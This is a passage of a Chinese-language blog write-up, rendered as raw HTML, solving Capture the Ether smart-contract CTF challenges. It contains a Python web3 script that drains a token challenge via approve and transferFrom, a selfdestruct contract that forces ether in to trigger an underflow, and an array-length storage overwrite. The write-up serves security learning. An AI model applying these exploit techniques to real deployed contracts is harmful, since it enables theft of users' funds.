class="line">challenge_addr = <span class="string">&quot;0xDC57892A1058d1e54c9364Ba726BB7643bdA6b2C&quot;</span></span><br><span class="line"></span><br><span class="line">MasterWalt = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">MasterPrivKey  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">HelpWalt = <span class="string">&quot;0x0cC33CD693bf9BF609e1B7C0E88E34Ff972Afe6f&quot;</span></span><br><span class="line">HelpPrivKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;name&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;approve&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;totalSupply&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transferFrom&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;decimals&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint8&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;symbol&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;allowance&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;_player&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Approval&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[api_key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line"></span><br><span class="line">MasterAccount = w3.eth.account.from_key(MasterPrivKey)</span><br><span class="line">HelpAccount   = w3.eth.account.from_key(HelpPrivKey)</span><br><span class="line"><span class="comment"># setp1</span></span><br><span class="line">log.info(<span class="string">&quot;Step1 , Transfer to HELP Account: 800 value &quot;</span>)</span><br><span class="line"><span class="comment">#    function transfer(address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transfer(HelpAccount.address, <span class="number">800</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">       <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step1 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 </span></span><br><span class="line">log.info(<span class="string">&quot;Step2 , Call approve&quot;</span>)</span><br><span class="line"><span class="comment">#    unction approve(address spender, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.approve(MasterAccount.address, <span class="number">1000</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(HelpAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed = HelpAccount.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step2 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 transferFrom(address)</span></span><br><span class="line">log.info(<span class="string">&quot;Step3 , call transferFrom to solve challenge&quot;</span>)</span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transferFrom(HelpAccount.address,HelpAccount.address, <span class="number">500</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step3 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(contract.functions.isComplete().call())</span><br><span class="line">log.success(<span class="string">&quot;Solved !&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3. Retirement fund"></a>3. Retirement fund</h3><p><strong>题目描述：</strong></p><p>This retirement fund is what economists call a <a href="https://en.wikipedia.org/wiki/Commitment_device">commitment device</a>. I’m trying to make sure I hold on to 1 ether for retirement.</p><p>I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I <em>do</em> withdraw early, 10% of my ether goes to the <code>beneficiary</code> (you!).</p><p>I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner &#x3D; msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration &#x3D; now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary &#x3D; player;</span><br><span class="line">        startBalance &#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            &#x2F;&#x2F; early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 &#x2F; 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn &#x3D; startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; penalty is what&#39;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM">Smooth Criminal</a>.</p><p><strong>解题：</strong></p><p>题目设置了一个十年后才能取出 eth 的合约， 要求我们提前取出所有的 Balance 。重点在  <code>collectPenalty</code> 函数上。</p><p>如果我们能使得 <code>withdrawn &gt; 0</code>  成立， 则可以取出所有的恶 balance , 我们会注意到   <code>startBalance - address(this).balance</code>  存在溢出， 但是条件得是 <code>startBalance</code>  小于 <code>address(this).balance</code> 。 </p><p>这里涉及到一个知识点：</p><p> <code>SELFDESTRUCT</code> 函数可以强制发送 ETH：</p><p><code>SELFDESTRUCT</code>  是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的balance发送给参数所指定的地址，比较特殊的是这笔ether的发送将无视合约的fallback函数，所以它是强制性的 。</p><p>攻击合约代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">function ForceAttack(address target) public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png"></a></p><p>最后调用 <code>collectPenalty</code>  函数即可。</p><h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4. Mapping"></a>4. Mapping</h3><p><strong>题目描述:</strong></p><p>MATH: 750 POINTS</p><p><a href="https://capturetheether.com/challenges/math/mapping/#">Begin Challenge</a></p><p>Who needs <code>mapping</code>s? I’ve created a contract that can store key/value pairs using just an array.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        &#x2F;&#x2F; Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;&#x3D; key) &#123;</span><br><span class="line">            map.length &#x3D; key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=A259WnFMRXI">Map To My Heart</a>.</p><p><strong>解题：</strong></p><p>题目设置了 一个 map ， 我们可以对 map 进行操作， 要求将 <code>isComplete</code> 设置为 True 即可。 感觉就是溢出 map 的空间，覆盖到 <code>isComplete</code>  的位置即可。</p><p>通过了解，我们可以知道动态数组，其在声明中所在位置决定的存储位里存放的是其长度，而其中的变量的存储位则是基于其长度所在的存储进行，这部分的详细内容可以参见此处一篇翻译文章<a href="https://segmentfault.com/a/1190000013791133">了解以太坊智能合约存储</a></p><p>solidity的storage slot存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">slot 0: isComplete</span><br><span class="line">slot 1: map.length</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>动态数组内变量所在的存储位的计算公式即为</p><blockquote><p>keccak256(slot) + index</p></blockquote><p>map.length = key + 1;<br>当map.length溢出会回绕到slot 0 即可完成isComplete的覆盖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; binascii.unhexlify(&#39;%064x&#39; % 1)</span><br><span class="line">&gt;&gt;&gt; Web3.keccak(a)</span><br><span class="line">HexBytes(&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>则在 <code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>  位置设置为 1 即可。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png"></a></p><h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5. Donation"></a>5. Donation</h3><p><strong>题目描述：</strong></p><p>A candidate you don’t like is accepting campaign contributions via the smart contract below.</p><p>To complete this challenge, steal the candidate’s ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span 